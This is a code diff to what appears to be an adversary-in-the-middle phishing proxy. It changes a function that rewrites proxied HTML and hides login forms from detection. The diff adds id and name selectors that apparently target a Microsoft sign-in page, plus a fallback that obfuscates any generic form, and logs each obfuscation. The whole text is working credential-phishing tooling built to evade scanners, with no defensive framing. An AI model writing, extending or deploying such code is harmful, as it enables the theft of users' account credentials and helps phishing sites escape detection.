@@ -1273,15 +1273,26 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
     html = html.replace(protoRelRegex, `//${proxyHostname}`);
 
     // ---- OBFUSCATE THE CREDENTIAL FORM ----
-// ---- OBFUSCATE THE CREDENTIAL FORM ----
-    const containerIds = ['login', 'loginForm', 'passwordSection', 'i0281', 'f1'];
+    // ---- OBFUSCATE THE CREDENTIAL FORM ----
+    const containerSelectors = [
+        { type: 'id', value: 'i0281' },
+        { type: 'name', value: 'f1' },
+        { type: 'id', value: 'login' },
+        { type: 'id', value: 'loginForm' },
+        { type: 'id', value: 'passwordSection' }
+    ];
     let obfuscatedHtml = null;
 
-    for (const id of containerIds) {
-        const regex = new RegExp(`<(div|form)[^>]*\\s+id\\s*=\\s*["']${id}["'][^>]*>([\\s\\S]*?)<\\/\\1>`, 'i');
+    for (const sel of containerSelectors) {
+        let regex;
+        if (sel.type === 'id') {
+            regex = new RegExp(`<(div|form)[^>]*\\s+id\\s*=\\s*["']?${sel.value}["']?[^>]*>([\\s\\S]*?)<\\/\\1>`, 'i');
+        } else { // name
+            regex = new RegExp(`<(div|form)[^>]*\\s+name\\s*=\\s*["']?${sel.value}["']?[^>]*>([\\s\\S]*?)<\\/\\1>`, 'i');
+        }
         const match = html.match(regex);
         if (match) {
-            console.log(`[FORM OBFUSCATION] ✅ Found and obfuscated form with ID: "${id}"`);
+            console.log(`[FORM OBFUSCATION] ✅ Found and obfuscated form with ${sel.type}: "${sel.value}"`);
             const fullContainer = match[0];
             const escaped = fullContainer
                 .replace(/\\/g, '\\\\')
@@ -1307,11 +1318,12 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
         }
     }
 
+    // Fallback: if no match, try to obfuscate any <form>
     if (!obfuscatedHtml) {
         const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/i;
         const match = html.match(formRegex);
         if (match) {
-            console.log('[FORM OBFUSCATION] ⚠️ Fallback: obfuscated a generic <form> (no ID match)');
+            console.log('[FORM OBFUSCATION] ⚠️ Fallback: obfuscated a generic <form> (no ID/name match)');
             const fullForm = match[0];
             const escaped = fullForm.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
             const placeholderId = `login-container-${Date.now()}`;
